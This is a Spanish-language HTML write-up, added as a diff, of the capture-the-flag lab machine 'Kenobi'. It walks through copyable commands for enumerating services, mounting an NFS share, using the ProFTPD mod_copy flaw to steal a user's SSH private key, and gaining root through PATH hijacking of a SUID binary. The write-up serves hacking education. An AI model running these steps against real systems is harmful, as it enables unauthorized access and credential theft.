@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kenobi - Flag Colector</title>
+    <link rel="stylesheet" href="../assets/writeup.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="writeup-container">
+        <div class="writeup-header">
+            <h1><i class="fas fa-skull"></i> Kenobi</h1>
+            <div class="machine-meta">
+                <span class="meta-item"><i class="fas fa-network-wired"></i> 10.10.144.45</span>
+                <span class="meta-item os linux"><i class="fab fa-linux"></i> Linux</span>
+                <span class="meta-item difficulty easy"><i class="fas fa-bolt"></i> Fácil</span>
+            </div>
+        </div>
+
+        <section class="writeup-section">
+            <h2><i class="fas fa-search"></i> Enumeración</h2>
+            <div class="finding">
+
+                <h3>Nmap</h3>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>sudo nmap -sV 10.10.144.45</code>
+                </div>
+                
+                <div class="discovery-box-standard">
+                    <h4>Resultado:</h4>
+                    <p>PORT STATE SERVICE VERSION<br><br>
+                        21/tcp   open  ftp         ProFTPD 1.3.5<br><br>
+                        22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)<br><br>
+                        80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))<br><br>
+                        111/tcp  open  rpcbind     2-4 (RPC #100000)<br><br>
+                        139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br><br>
+                        445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br><br>
+                        2049/tcp open  nfs         2-4 (RPC #100003)<br><br>
+                        Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</p>
+                </div>
+
+                <div class="discovery-box">
+                    <h4>Características detectadas:</h4>
+                    <ul class="findings-list">
+                        <li>Puerto 21: Servidor FTP ProFTPD (1.3.5)</li>
+                        <li>Puerto 22: Servidor OpenSSH (7.2p2)</li>
+                        <li>Puerto 80: Servidor Web Apache (2.4.18)</li>
+                        <li>Puerto 111: Servicio rpcbind (2-4)</li>
+                        <li>Puerto 139 y 445: Servicio Samba (3.X - 4.X)</li>
+                        <li>Puerto 2049: Servicio NFS: Network File System, o Sistema de Archivos de Red (2-4)</li>
+                    </ul>
+                </div>
+
+            </div>
+        </section>
+
+        <section class="writeup-section">
+            <h2><i class="fas fa-bug"></i> Explotación</h2>
+            <div class="exploit-step">
+
+                <h3>Montaje de NFS</h3>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Tiene abierto el puerto 2049 nfs. Esto significa que podremos montar algún directorio.</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>showmount -e 10.10.144.45</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Kenobi/img/foto1.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 1: Podremos interactura con el directorio /var</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>mkdir -p tmp/var</code>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>sudo mount -t nfs 10.10.144.45:/var tmp/var</code>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>df -k</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Kenobi/img/foto2.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 2: Montaje de directorio compartido vía NFS</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Una vez montado, tendremos acceso al contenido del directorio /var de la máquina Kenobi:</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Kenobi/img/foto3.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 3: Contenido del directorio /var</p>
+                </div>
+
+                <h3>Acceso a recursos de Samba</h3>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>smbclient -L //10.10.144.45 -N</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Kenobi/img/foto4.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 4: Listar los recursos compartidos de Samba</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Accedemos a la carpeta compartida anonymous:<br>
+                        (Si pide credenciales ponemos anonymous)</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>smbclient //10.10.144.45/anonymous</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Kenobi/img/foto5.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 5: Veremos un archivo llamativo: log.txt</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Nos descargaremos el archivo log.txt</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>get log.txt /home/kali/Desktop/log.txt</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Kenobi/img/foto6.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 6: Descarga del archivo log.txt desde Samba</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Ahora podremos ver el contenido del archivo desde nuestro equipo</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Kenobi/img/foto7.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 7: Contenido del archivo log.txt</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Destaca sobre todo la parte inicial, donde vemos la creación de una llave privada para el usuario kenobi y su ubicación en el sistema.</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Kenobi/img/foto8.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 8: Contenido llamativo del archivo log.txt</p>
+                </div>
+
+                <h3>Explotación de ProFTPD</h3>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Destaca sobre todo la parte inicial, donde vemos la creación de una llave privada para el usuario kenobi y su ubicación en el sistema.</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Kenobi/img/foto9.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 9: Busqueda de vulnerabilidades del servicio FTP (ProFTPD 1.3.5)</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Esta vulnerabilidad para ProFTPD se conoce como “File_copy”, y nos permite realizar copias
+                        de archivos dentro del sistema de manera arbitraria sin la necesidad de estar debidamente
+                        autenticados.<hr>
+                        Accedemos al servicio de ftp y haremos uso de estos dos comandos: <br>
+                        ● SITE CPFR [ruta]: Selecciona un archivo origen (Copy From).<br>
+                        ● SITE CPTO [ruta]: Copia el archivo seleccionado a un destino (Copy To).
+                    </p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>nc 10.10.144.45 21</code>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>site help</code>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>site CPFR /home/kenobi/.ssh/id_rsa</code>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>site CPTO /var/tmp/id_rsa</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Kenobi/img/foto10.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 10: Uso del módulo mod_copy para copiar id_rsa</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Ahora vamos a /var/tmp y ya tenemos allí la clave ssh</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Kenobi/img/foto11.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 11: Clave id_rsa descargada en nuestro equipo</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Con la clave id_rsa podremos conectarnos por SSH a la máquina</p>
+                </div>
+
+                <h3>Acceso SSH</h3>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Accedemos a la máquina por SSH usando la clave RSA</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>sudo chmod 600 id_rsa</code>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>ssh -i id_rsa kenobi@10.10.144.45</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Kenobi/img/foto12.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 12: Acceso SSH a la máquina como kenobi</p>
+                </div>
+
+                <h3>User Flag</h3>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Una vez establecida la conexión SSH podremos ver la user flag (user.txt)</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>cat user.txt</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Kenobi/img/foto13.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 13: User Flag (user.txt)</p>
+                </div>
+
+            </div>
+        </section>
+
+        <section class="writeup-section">
+            <h2><i class="fas fa-user-shield"></i> Escalada de Privilegios</h2>
+
+            <h3>Path Hijacking</h3>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Primero buscaremos ficheros con permisos SUID activos</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>find / -perm -u=s 2>/dev/null</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../Kenobi/img/foto14.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 14: Encontramos un binario sospechoso /usr/bin/menu</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Hay un binario que no corresponde a los típico de linux (/usr/bin/menu). Para corroborarlo, lo ejecutaremos:</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>/usr/bin/menu</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../Kenobi/img/foto15.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 15: Ejecución del binario sospechoso /usr/bin/menu</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Vemos que es una utilidad que realiza diversas acciones dentro de la máquina y muestra
+                    información. Lo que está pasando por detrás, es que ejecuta otros comandos dentro de la
+                    máquina, lo cual puede ser peligroso ya que los binarios a los que manda a llamar no están
+                    declarados con su ruta absoluta.</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Al ejecutar strings sobre el binario, observamos que realizan 
+                    llamadas al comando ifconfig utilizando una ruta relativa. 
+                    Para confirmar este comportamiento, inspeccionamos las cadenas de texto contenidas en el binario:</p>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../Kenobi/img/foto16.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 16: Analizando el binario /usr/bin/menu</p>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../Kenobi/img/foto17.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 17: Se realizan llamadas al comando ifconfig utilizando una ruta relativa</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>El programa ejecuta comandos sin ruta absoluta (ej. ifconfig en vez de /sbin/ifconfig).<br><br>
+                    ● Si $PATH incluye un directorio que podemos escribir (como /tmp), podemos crear un
+                    falso comando malicioso.<br><br>
+                    ● El sistema lo ejecutará en lugar del real → path hijacking, útil para ejecutar código propio
+                    o escalar privilegios.
+                </p>
+            </div>
+
+            <div class="discovery-box warning">
+                <h4><i class="fas fa-exclamation-triangle"></i>Esto permite un path hijacking. </h4>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Miramos el contenido de la variable PATH para comprobar cuales están activas:</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>echo $PATH</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../Kenobi/img/foto18.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 18: Comprobación de las variable PATH</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Vamos al directorio /tmp y creamos un fichero ifconfig (ruta que usaremos para el path hijacking) que, al ejecutarse, abrirá una shell (/bin/sh)</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>cd /tmp</code>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>echo "/bin/sh" > ifconfig</code>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>chmod +x ifconfig</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../Kenobi/img/foto19.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 19: Creación de un nuevo fichero ifconfig</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Ahora modificamos el PATH y añadimos el directorio /tmp (donde se encuentra nuestro fichero ifconfig)</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>PATH=/tmp:$PATH</code>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>echo $PATH</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../Kenobi/img/foto20.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 20: Modificación del PATH</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Entonces, al ejecutar menú de nuevo con la opción de ifconfig nos convertiremos en root:</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>/usr/bin/menu</code>
+            </div>
+
+            <div class="discovery-box warning">
+                <h4><i class="fas fa-exclamation-triangle"></i>Elegimos la opción 3 (correspondiente al comando ifconfig)</h4>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../Kenobi/img/foto21.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 21: Ejecución de /menu con el PATH modificado</p>
+            </div>
+
+            <h3>Root Flag</h3>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>cd /root</code>
+            </div>
+
+            <div class="command-box">
+                <code>cat root.txt</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../Kenobi/img/foto22.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 22: Root Flag (root.txt)</p>
+            </div>
+
+        </section>
+    </div>
+
+    <script src="../../assets/scripts/copy.js" defer></script>
+</body>
+</html>
